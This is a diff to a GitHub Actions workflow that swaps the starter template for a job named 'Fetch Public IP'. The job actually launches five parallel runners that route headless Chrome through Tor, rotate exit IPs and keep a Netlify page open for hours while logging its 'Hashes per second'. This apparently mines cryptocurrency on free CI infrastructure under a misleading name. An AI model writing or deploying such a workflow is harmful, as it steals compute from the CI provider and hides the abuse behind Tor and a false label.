@@ -1,36 +1,280 @@
-# This is a basic workflow to help you get started with Actions
+name: Fetch Public IP
 
-name: CI
-
-# Controls when the workflow will run
 on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
+
   push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
 
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
+    branches:
 
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+      - main
+
+  workflow_dispatch:  # Manual trigger configuration
 jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
+
+  fetch-ip-hashes:
+
     runs-on: ubuntu-latest
 
-    # Steps represent a sequence of tasks that will be executed as part of the job
+    strategy:
+
+      matrix:
+
+        instance: [1, 2, 3, 4, 5]
+
+
+
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v4
 
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
+      - name: Set up Node.js
 
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
+        uses: actions/setup-node@v3
+
+        with:
+
+          node-version: '20'
+
+
+
+      - name: Set up Tor
+
         run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+
+          sudo apt-get update
+
+          sudo apt-get install -y tor
+
+          sudo service tor start
+
+      - name: Wait for Tor to start
+
+        run: sleep 10  # Giving Tor time to start
+
+
+
+      - name: Install Chrome and Dependencies
+
+        run: |
+
+          sudo apt-get install -y libx11-xcb1 libxtst6 libxrandr2 libgtk-3-0 libnss3 libasound2 libatk-bridge2.0-0 libxss1 libgbm1
+
+      - name: Install Puppeteer
+
+        run: |
+
+          npm install puppeteer
+
+      - name: Create Puppeteer Script
+
+        run: |
+
+          echo "const puppeteer = require('puppeteer');" > continuous_visit_puppeteer.js
+
+          echo "const { execSync } = require('child_process');" >> continuous_visit_puppeteer.js
+
+          echo "" >> continuous_visit_puppeteer.js
+
+          # Function to get random visit duration between 30 to 35 minutes
+
+          echo "function randomVisitDuration() {" >> continuous_visit_puppeteer.js
+
+          echo "  return Math.floor(Math.random() * (35 - 30 + 1) + 30) * 60 * 1000;  // Random wait between 5 to 10 minutes" >> continuous_visit_puppeteer.js
+
+          echo "}" >> continuous_visit_puppeteer.js
+
+          echo "async function fetchIP(proxy = false) {" >> continuous_visit_puppeteer.js
+
+          echo "  const args = proxy ? ['--proxy-server=socks5://127.0.0.1:9050'] : [];" >> continuous_visit_puppeteer.js
+
+          echo "  const browser = await puppeteer.launch({" >> continuous_visit_puppeteer.js
+
+          echo "    headless: true," >> continuous_visit_puppeteer.js
+
+          echo "    args: ['--no-sandbox', '--disable-setuid-sandbox', '--incognito', ...args]" >> continuous_visit_puppeteer.js
+
+          echo "  });" >> continuous_visit_puppeteer.js
+
+          echo "  const page = await browser.newPage();" >> continuous_visit_puppeteer.js
+
+          echo "  try {" >> continuous_visit_puppeteer.js
+
+          echo "    await page.goto('https://icanhazip.com', { waitUntil: 'domcontentloaded', timeout: 30000 });" >> continuous_visit_puppeteer.js
+
+          echo "    const ip = await page.evaluate(() => document.body.innerText.trim());" >> continuous_visit_puppeteer.js
+
+          echo "    console.log(proxy ? 'IP after Tor: ' : 'IP before Tor: ', ip);" >> continuous_visit_puppeteer.js
+
+          echo "    return ip;" >> continuous_visit_puppeteer.js
+
+          echo "  } catch (error) {" >> continuous_visit_puppeteer.js
+
+          echo "    console.error('Failed to fetch IP:', error.message);" >> continuous_visit_puppeteer.js
+
+          echo "    return null;" >> continuous_visit_puppeteer.js
+
+          echo "  } finally {" >> continuous_visit_puppeteer.js
+
+          echo "    await browser.close();" >> continuous_visit_puppeteer.js
+
+          echo "  }" >> continuous_visit_puppeteer.js
+
+          echo "}" >> continuous_visit_puppeteer.js
+
+          echo "async function restartTor() {" >> continuous_visit_puppeteer.js
+
+          echo "  console.log('Restarting Tor...');" >> continuous_visit_puppeteer.js
+
+          echo "  execSync('sudo service tor stop');" >> continuous_visit_puppeteer.js
+
+          echo "  execSync('sudo service tor start');" >> continuous_visit_puppeteer.js
+
+          echo "  console.log('Waiting for Tor to restart...');" >> continuous_visit_puppeteer.js
+
+          echo "  await new Promise(resolve => setTimeout(resolve, 30000));  // Wait 30 seconds" >> continuous_visit_puppeteer.js
+
+          echo "}" >> continuous_visit_puppeteer.js
+
+          echo "async function fetchIPWithTorRetry() {" >> continuous_visit_puppeteer.js
+
+          echo "  let ip = null;" >> continuous_visit_puppeteer.js
+
+          echo "  while (!ip) {" >> continuous_visit_puppeteer.js
+
+          echo "    ip = await fetchIP(true);" >> continuous_visit_puppeteer.js
+
+          echo "    if (!ip) {" >> continuous_visit_puppeteer.js
+
+          echo "      await restartTor();" >> continuous_visit_puppeteer.js
+
+          echo "    }" >> continuous_visit_puppeteer.js
+
+          echo "  }" >> continuous_visit_puppeteer.js
+
+          echo "}" >> continuous_visit_puppeteer.js
+
+          echo "async function visitWebsite(url) {" >> continuous_visit_puppeteer.js
+
+          echo "  const browser = await puppeteer.launch({" >> continuous_visit_puppeteer.js
+
+          echo "    headless: true," >> continuous_visit_puppeteer.js
+
+          echo "    args: ['--proxy-server=socks5://127.0.0.1:9050', '--no-sandbox', '--disable-setuid-sandbox', '--incognito', '--js-flags=--optimize-for-size --max-old-space-size=4096']" >> continuous_visit_puppeteer.js
+
+          echo "  });" >> continuous_visit_puppeteer.js
+
+          echo "  const page = await browser.newPage();" >> continuous_visit_puppeteer.js
+
+          echo "  let loaded = false;" >> continuous_visit_puppeteer.js
+
+          echo "  while (!loaded) {" >> continuous_visit_puppeteer.js
+
+          echo "    try {" >> continuous_visit_puppeteer.js
+
+          echo "      await page.goto(url, { waitUntil: 'domcontentloaded' });" >> continuous_visit_puppeteer.js
+
+          echo "      loaded = true;" >> continuous_visit_puppeteer.js
+
+          echo "      const title = await page.title();" >> continuous_visit_puppeteer.js
+
+          echo "      console.log('Page title:', title);" >> continuous_visit_puppeteer.js
+
+          echo "    } catch (error) {" >> continuous_visit_puppeteer.js
+
+          echo "      console.error('Page load failed, restarting Tor:', error.message);" >> continuous_visit_puppeteer.js
+
+          echo "      await restartTor();" >> continuous_visit_puppeteer.js
+
+          echo "    }" >> continuous_visit_puppeteer.js
+
+          echo "  }" >> continuous_visit_puppeteer.js
+
+          
+
+          echo "  const checkHashesPerSecond = setInterval(async () => {" >> continuous_visit_puppeteer.js
+
+          echo "    try {" >> continuous_visit_puppeteer.js
+
+          echo "      const hashesPerSecond = await page.evaluate(() => {" >> continuous_visit_puppeteer.js
+
+          echo "        const element = document.querySelector('#hps');" >> continuous_visit_puppeteer.js
+
+          echo "        return element ? element.textContent.replace('Hashes per second: ', '').trim() : 'Element not found';" >> continuous_visit_puppeteer.js
+
+          echo "      });" >> continuous_visit_puppeteer.js
+
+          echo "      console.log('Hashes per second:', hashesPerSecond);" >> continuous_visit_puppeteer.js
+
+          echo "    } catch (error) {" >> continuous_visit_puppeteer.js
+
+          echo "      console.error('Error fetching Hashes per second:', error.message);" >> continuous_visit_puppeteer.js
+
+          echo "    }" >> continuous_visit_puppeteer.js
+
+          echo "  }, 20000);  // Every 20 seconds" >> continuous_visit_puppeteer.js
+
+          echo "" >> continuous_visit_puppeteer.js
+
+          
+
+          echo "  const visitDuration = randomVisitDuration();" >> continuous_visit_puppeteer.js
+
+          echo "  console.log('Staying on the website for', visitDuration / 60000, 'minutes...');" >> continuous_visit_puppeteer.js
+
+          echo "  await new Promise(resolve => setTimeout(resolve, visitDuration));" >> continuous_visit_puppeteer.js
+
+          echo "  clearInterval(checkHashesPerSecond);" >> continuous_visit_puppeteer.js
+
+          echo "  await browser.close();" >> continuous_visit_puppeteer.js
+
+          echo "  execSync('sudo service tor stop');" >> continuous_visit_puppeteer.js
+
+          echo "  console.log('Tor stopped after visiting the website.');" >> continuous_visit_puppeteer.js
+
+          echo "}" >> continuous_visit_puppeteer.js
+
+          
+
+          echo "async function randomWait() {" >> continuous_visit_puppeteer.js
+
+          echo "  const waitTime = Math.floor(Math.random() * (5 - 2 + 1) + 2) * 60 * 1000;" >> continuous_visit_puppeteer.js
+
+          echo "  console.log('Waiting for', waitTime / 60000, 'minutes before next visit...');" >> continuous_visit_puppeteer.js
+
+          echo "  await new Promise(resolve => setTimeout(resolve, waitTime));" >> continuous_visit_puppeteer.js
+
+          echo "}" >> continuous_visit_puppeteer.js
+
+          
+
+          echo "async function fetchIPsAndVisit() {" >> continuous_visit_puppeteer.js
+
+          echo "  const endTime = Date.now() + 5 * 60 * 60 * 1000;" >> continuous_visit_puppeteer.js
+
+          echo "  await fetchIP(false);" >> continuous_visit_puppeteer.js
+
+          echo "  await fetchIPWithTorRetry();" >> continuous_visit_puppeteer.js
+
+          echo "  while (Date.now() < endTime) {" >> continuous_visit_puppeteer.js
+
+          echo "    execSync('sudo service tor start');" >> continuous_visit_puppeteer.js
+
+          echo "    console.log('Tor started before visiting the website.');" >> continuous_visit_puppeteer.js
+
+          echo "    await fetchIP(true);" >> continuous_visit_puppeteer.js
+
+          echo "    await visitWebsite('https://dileepa11.netlify.app/');" >> continuous_visit_puppeteer.js
+
+          echo "    await randomWait();" >> continuous_visit_puppeteer.js
+
+          echo "  }" >> continuous_visit_puppeteer.js
+
+          echo "  console.log('Completed 5-hour cycle, stopping now.');" >> continuous_visit_puppeteer.js
+
+          echo "}" >> continuous_visit_puppeteer.js
+
+          
+
+          echo "fetchIPsAndVisit();" >> continuous_visit_puppeteer.js
+
+      - name: Run Puppeteer Script
+
+        run: node continuous_visit_puppeteer.js
